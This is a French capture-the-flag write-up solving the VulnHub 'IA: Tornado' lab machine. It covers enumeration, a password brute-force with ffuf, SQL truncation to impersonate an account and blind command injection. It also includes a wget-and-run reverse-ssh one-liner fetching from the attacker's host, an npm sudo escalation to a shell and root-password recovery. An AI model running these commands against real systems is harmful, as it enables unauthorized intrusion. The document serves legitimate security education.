---
title: Solution du CTF IA Tornado de VulnHub
tags: [CTF, VulnHub]
---

### Bernado

Le CTF [IA: Tornado](https://vulnhub.com/entry/ia-tornado,639/) fait partie d'une trilogie de CTFs créés par [Infosec Articles](https://www.infosecarticles.com/) (d'où le "IA").

On y croise une vulnérabilité plutôt rare sur les CTFs mais on y reviendra.

```console
$ sudo nmap  -p- -T5 192.168.56.114
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.114
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:DB:4F:49 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
```

Vu que le serveur web ne livre que la page par défaut d'Apache, on se dirige immédiatement vers l'énumération :

```console
$ feroxbuster -u http://192.168.56.114/ -w DirBuster-0.12/directory-list-2.3-big.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.114/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      317c http://192.168.56.114/manual
301        9l       28w      321c http://192.168.56.114/javascript
403        9l       28w      279c http://192.168.56.114/server-status
301        9l       28w      318c http://192.168.56.114/bluesky
[####################] - 2m   1273562/1273562 0s      found:4       errors:0      
[####################] - 2m   1273562/1273562 7277/s  http://192.168.56.114/
```

Le dossier `bluesky` semblait prometteur, mais ça ressemble à un template de site web sans réelle interaction.

Avec une autre énumération (cette via via Wapiti) je trouve des scripts cachés dans ce dossier :

```
[*] Launching module buster
Found webpage http://192.168.56.114/bluesky/login.php
Found webpage http://192.168.56.114/bluesky/index.html
Found webpage http://192.168.56.114/bluesky/contact.php
Found webpage http://192.168.56.114/bluesky/logout.php
Found webpage http://192.168.56.114/bluesky/signup.php
Found webpage http://192.168.56.114/bluesky/about.php
Found webpage http://192.168.56.114/bluesky/dashboard.php
Found webpage http://192.168.56.114/bluesky/port.php
Found webpage http://192.168.56.114/bluesky/js/
Found webpage http://192.168.56.114/bluesky/css/
Found webpage http://192.168.56.114/bluesky/imgs/
Found webpage http://192.168.56.114/bluesky/css/style.css
Found webpage http://192.168.56.114/bluesky/imgs/logo.png
```

Les scripts ont un défaut de conception : ils livrent leurs contenus malgré la présence d'une redirection. C'est un oubli classique de la part des développeurs PHP qui appellent la fonction `location` mais pas `exit` juste après.

Cela ne veut pas forcément dire que l'on peut exécuter toutes les actions possibles sans authentification, mais on peut voir par exemple des champs de formulaire, des liens, etc.

Par exemple dans le code HTML de `/bluesky/port.php` on trouve ces informations :

```html
<!-- /home/tornado/imp.txt -->

</body>
</html>

<h2 style='color:white;'>LFI vulnerability is patched , but still don't forget to test for it again ! </h2>
```

On peut créer un compte sur l'appli web. Une fois connecté, j'ai cherché en vain un paramètre qui serait vulnérable à une LFI (faille d'inclusion locale). J'ai aussi bruteforcé les noms de paramètres au cas où la vulnérabilité serait cachée, mais ç'a n'a mené nulle part.

En réalité, il n'y avait pas de LFI, le message portait à confusion. Il fallait profiter du fait que les user-dir d'Apache étaient activés et accéder au fichier `imp.txt` sous `http://192.168.56.114/~tornado/`.

Comportement assez déroutant d'ailleurs : `~tornado` retournait un 404 et non une redirection, mais `~tornado/` donnait un 403.

Le fichier texte contenait ces informations :

```
ceo@tornado
cto@tornado
manager@tornado
hr@tornado
lfi@tornado
admin@tornado
jacob@tornado
it@tornado
sales@tornado
```

Si je tente d'enregistrer ces comptes, seuls trois donnent une erreur pour dire qu'ils existent déjà :

`hr@tornado`, `admin@tornado`, `jacob@tornado`

On peut casser le mot de passe du compte `admin` facilement :

```console
$ ffuf -u http://192.168.56.114/bluesky/login.php -w wordlists/rockyou.txt -X POST -d 'uname=admin@tornado&upass=FUZZ&btn=Login' -H "Content-type: application/x-www-form-urlencoded" -fs 878

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.56.114/bluesky/login.php
 :: Wordlist         : FUZZ: wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : uname=admin@tornado&upass=FUZZ&btn=Login
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 878
________________________________________________

hello                   [Status: 302, Size: 824, Words: 65, Lines: 39, Duration: 9ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Toutefois, une fois connecté, on ne trouve rien d'intéressant. On va se concentrer sur les comptes restants.

### Renaultfuego

Si on regarde attentivement le code HTML dans `signup.php` et aussi dans `login.php` on remarque la présence d'une limite sur le nombre de caractères autorisés :

```html
<form method="POST" style="text-align:center;">
<input type="text" name="uname" placeholder="email" maxlength="13"><br><br>
<input type="password" name="upass" placeholder="password"><br><br>
<input type="submit" value="Signup" name="btn" class="button"><br>
</form>
```

13 c'est exactement la taille de `jacob@tornado`. On est en fait sur un scénario de vulnérabilité SQL Truncation comme sur [le CTF OwlNest de VulnHub]({% link _posts/2022-12-18-Solution-du-CTF-OwlNest-de-VulnHub.md %}#%C3%AAtre-admin-%C3%A0-la-place-de-ladmin).

Le principe est que le champ `uname` est déclaré dans le schéma SQL comme un `VARCHAR(13)`. Si le mode strict de SQL est désactivé et que l'on passe plus de caractères, alors ces derniers sont tronqués pour ne conserver que 13 caractères.

Cela ne veut pas dire que l'on peut écraser le compte `jacob` existant, mais sur une appli qui fait une vérification préalable sur la disponibilité d'un utilisateur, on pourrait bypasser ça pour créer un autre compte `jacob`.

Le fait que l'on puisse ensuite accèder à certaines informations dépendra alors de la logique de l'application (est-ce que le nom d'utilisateur est vérifié via une valeur hardcodée ou par exemple via un champ `is_admin` dans la base).

Donc ici, j'enregistre le compte `jacob@tornado1`. Le serveur tronque cela en `jacob@tornado` puis je me connecte avec cet identifiant et le mot de passe que j'ai défini.

Dans la page `contact.php` il y a désormais un champ `comment` qui est vulnérable à une exécution de commande en aveugle. Si on rentre `sleep 10` on obtient une temporisation (Wapiti est capable de détecter ce genre d'injection).

Je lance `reverse-ssh` sur la machine :

```bash
cd /tmp;wget http://192.168.56.1/reverse-sshx64;chmod 755 reverse-sshx64;nohup ./reverse-sshx64&
```

Je peux ensuite m'y connecter sur le port 31337 :

```console
$ ssh -p 31337 192.168.56.116
devloop@192.168.56.116's password: 
www-data@tornado:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@tornado:/tmp$ sudo -l
Matching Defaults entries for www-data on tornado:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on tornado:
    (catchme) NOPASSWD: /usr/bin/npm
```

J'utilise un [GTFObin pour npm](https://gtfobins.github.io/gtfobins/npm/) pour atteindre l'utilisateur `catchme` :

```console
www-data@tornado:/tmp$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
www-data@tornado:/tmp$ sudo -u catchme npm -C . i
npm WARN npm npm does not support Node.js v10.21.0
npm WARN npm You should probably upgrade to a newer version of node as we
npm WARN npm can't make any promises that npm will work with this version.
npm WARN npm Supported releases of Node.js are the latest release of 4, 6, 7, 8, 9.
npm WARN npm You can find the latest version at https://nodejs.org/

> @ preinstall /tmp
> /bin/sh

$ id
uid=1000(catchme) gid=1000(catchme) groups=1000(catchme),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

### Tornado

Le fichier `enc.py` attire ma curiosité :

```console
catchme@tornado:~$ ls -al
total 32
drwx------ 3 catchme catchme 4096 Dec 10  2020 .
drwxr-xr-x 4 root    root    4096 Dec  9  2020 ..
-rw------- 1 catchme catchme    0 Dec 10  2020 .bash_history
-rw-r--r-- 1 catchme catchme  220 Dec  8  2020 .bash_logout
-rw-r--r-- 1 catchme catchme 3526 Dec  8  2020 .bashrc
drwxr-xr-x 3 catchme catchme 4096 Dec 10  2020 .local
-rw-r--r-- 1 catchme catchme  807 Dec  8  2020 .profile
-rwx------ 1 catchme catchme  961 Dec 10  2020 enc.py
-rw------- 1 catchme catchme   15 Dec 10  2020 user.txt
catchme@tornado:~$ cat user.txt 
HMVkeyedcaesar
catchme@tornado:~$ cat enc.py 
```

J'ai d'abord cru qu'il fallait retrouver un fichier chiffré sur le système, mais en fait, il y a une variable `encrypted` non utilisée :

```python
s = "abcdefghijklmnopqrstuvwxyz"
shift=0
encrypted="hcjqnnsotrrwnqc"
#
k = input("Input a single word key :")
if len(k) > 1:
        print("Something bad happened!")
        exit(-1)

i = ord(k)
s = s.replace(k, '')
s = k + s
t = input("Enter the string to Encrypt here:")
li = len(t)
print("Encrypted message is:", end="")
while li != 0:
        for n in t:
                j = ord(n)
                if j == ord('a'):
                        j = i
                        print(chr(j), end="")
                        li = li - 1

                elif n > 'a' and n <= k:
                        j = j - 1
                        print(chr(j), end="")
                        li = li - 1

                elif n > k:
                        print(n, end="")
                        li = li - 1

                elif ord(n) == 32:  # espace
                        print(chr(32), end="")
                        li = li - 1

                elif j >= 48 and j <= 57:  # entre 0 et 9
                        print(chr(j), end="")
                        li = li - 1

                elif j >= 33 and j <= 47:  # entre ! et /
                        print(chr(j), end="")
                        li = li - 1

                elif j >= 58 and j <= 64:  # entre : et @
                        print(chr(j), end="")
                        li = li - 1

                elif j >= 91 and j <= 96:  # entre [ et `
                        print(chr(j), end="")
                        li = li - 1

                elif j >= 123 and j <= 126:  # entre { et ~
                        print(chr(j), end="")
                        li = li - 1
```

J'ai rajouté quelques commentaires dans le code. Ce programme attend comme clé un seul et unique caractère.

Dans le texte clair, si un caractère est `a`, alors il est remplacé par la clé.

Si le caractère en clair est plus petit (alphabétiquement) que la clé, alors il subit juste un décalage de `-1` (exemple : `c` devient `b`).

Si le caractère en clair est plus grand, alors il reste tel quel.

Pour terminer, les chiffres, caractères spéciaux, espaces... ne sont pas modifiés.

En fin de compte, c'est assez simple. Il suffit de copier le chiffré sur https://rot13.com/ et de choisir le décalage de `1` qui correspond à la majorité des caractères. On obtient alors `idkrootpussxord`.

On devine que `u` est la clé, car le `a` de `password` a été emplacé. `x` étant au-dessus de `u` il ne devait pas être décalé de 1 donc le mot de passe est `idkrootpassword`. C'est le mot de passe root :

```console
catchme@tornado:~$ su root
Password: 
root@tornado:/home/catchme# cd /root/
root@tornado:~# ls
root.txt
root@tornado:~# cat root.txt 
HMVgoodwork
```

### Comment c'est fait

On peut vérifier le tronquage SQL dans la pratique :

```console
MariaDB [time]> describe user;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| name     | varchar(13) | YES  |     | NULL    |       |
| password | varchar(10) | YES  |     | NULL    |       |
| id       | int(3)      | YES  |     | NULL    |       |
| active   | int(1)      | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
4 rows in set (0.003 sec)

MariaDB [time]> insert into user (name, password) values ("0123456789ABCDEFGH", "0123456789ABCDEFGH");
Query OK, 1 row affected, 2 warnings (0.009 sec)

MariaDB [time]> select * from user where name like "0123%";
+---------------+------------+------+--------+
| name          | password   | id   | active |
+---------------+------------+------+--------+
| 0123456789ABC | 0123456789 | NULL |   NULL |
+---------------+------------+------+--------+
1 row in set (0.001 sec)
```

Dans la page des inscriptions, on voit bien les deux étapes (vérification préalable puis inscription) :

```php
<html>
<title>Signup</title>

<body style="background-color:black;">
<img src="h.jpg" style="width:300px;height:300px;padding-left:510px;">
<form method="POST" style="text-align:center;">
<input type="text" name="uname" placeholder="email" maxlength="13"><br><br>
<input type="password" name="upass" placeholder="password"><br><br>
<input type="submit" value="Signup" name="btn" class="button"><br>
</form>
</body>
</html>

<?php

error_reporting(0);
session_start();

if (isset($_POST['btn'])) {
    $id = $_POST['uname'];
    $pass = $_POST['upass'];
    //$pass=hash('sha256', $pass);
    try {
        $dbh = new PDO('mysql:host=127.0.0.1;dbname=time', 'root', 'heheroot');
        $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    } catch (PDOException $ex) {
        echo 'Execute Failed: ' . $ex->getMessage();
    }
    if ($id !== '' and $pass !== '') {
        echo "name:-" . strlen($id);
        $sq = "select name from user where name = :id";
        $q = "insert into user (name,password) values(:id,:pass)";
        $sth = $dbh->prepare($q);
        $sths = $dbh->prepare($sq);
        $sths->bindParam(':id', $id);
        $sth->bindParam(':id', $id);
        $sth->bindParam(':pass', $pass);
        $sths->execute();
        $result = $sths->fetchAll();
        if (!$result) {
            if ($sth->execute()) {
                echo "<script>alert('Registered successfully!')</script>";
            } else {
                echo "hsdbsd machi gayi bc";
                echo "'Error-> '." . $sth->errorInfo();
            }
        } else {
            echo "<script>alert('User already registered ')</script>";
        }
    }
}

?>
```

Comme `jacob1@tornado` n'existait pas, la requête `INSERT` a été exécutée et le serveur a tronqué la valeur, ce qui a généré un second compte du même nom.

Voici maintenant le code pour la connexion :

```php
<?php
error_reporting(0);
session_start();

if (isset($_POST['btn'])) {
    $id = $_POST['uname'];
    $pass = $_POST['upass'];
    try {
        $dbh = new PDO('mysql:host=127.0.0.1;dbname=time', 'root', 'heheroot');
        $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    } catch (PDOException $ex) {
        echo 'Execute Failed: ' . $ex->getMessage();
    }
    $q = "SELECT name,password FROM user WHERE name = :id and password= :pass";
    $sth = $dbh->prepare($q);
    $sth->bindParam(':id', $id);
    $sth->bindParam(':pass', $pass);
    $sth->execute();
    $result = $sth->fetchAll();
    if ($result) {
        foreach ($result as $row) {
            if ($row['name'] !== '') {
                if ($row['password'] !== '') {
                    $_SESSION['favcolor'] = $row['name'];
                    header("Location: dashboard.php");
                }
            }
        }
    } else {
        echo "<script>alert('umm...something bad happened')</script>";
    }
}
?>
```

Ici l'exploitation est rendue possible par le fait que la correspondance `name` / `password` est vérifiée directement par SQL. Si le script cherchait la première occurrence de `jacob` et comparait ensuite le mot de passe à celui saisi ça aurait pu poser des problèmes.
